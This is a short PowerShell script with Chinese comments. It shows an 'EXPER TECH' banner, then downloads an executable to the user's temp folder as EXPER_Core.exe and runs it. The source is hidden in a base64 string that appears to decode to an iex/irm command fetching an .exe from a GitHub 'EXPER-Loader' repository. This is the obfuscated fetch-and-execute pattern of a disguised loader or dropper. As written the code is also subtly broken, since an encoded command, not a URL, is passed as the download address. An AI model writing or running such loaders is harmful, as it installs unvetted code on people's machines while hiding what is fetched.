# 1. 蓝色 EXPER 界面（之前给你的代码）
Write-Host "E X P E R  T E C H" -ForegroundColor Cyan

# 2. 核心：去下载刚才那个 EXE
$Url = "aQBlAHgAKABpAHIAbQAgACcAaAB0AHQAcABzADoALwAvAHIAYQB3AC4AZwBpAHQAaAB1AGIAdQBzAGUAcgBjAG8AbgB0AGUAbgB0AC4AYwBvAG0ALwB6AHUAaQBhAGkAeABpAHgAaQBiAGEAbwBiAGUAaQAtAG0AYQB4AC8ARQBYAFAARQBSAC0ATABvAGEAZABlAHIALwByAGUAZgBzAC8AaABlAGEAZABzAC8AbQBhAGkAbgAvAEwAbwBhAGQAZQByAC0AQwBOADIALgBlAHgAZQAnACkA"
$Path = "$env:TEMP\EXPER_Core.exe"

Write-Host "[>] Downloading core components..." -ForegroundColor Gray
Invoke-WebRequest -Uri $Url -OutFile $Path

# 3. 运行
Start-Process $Path
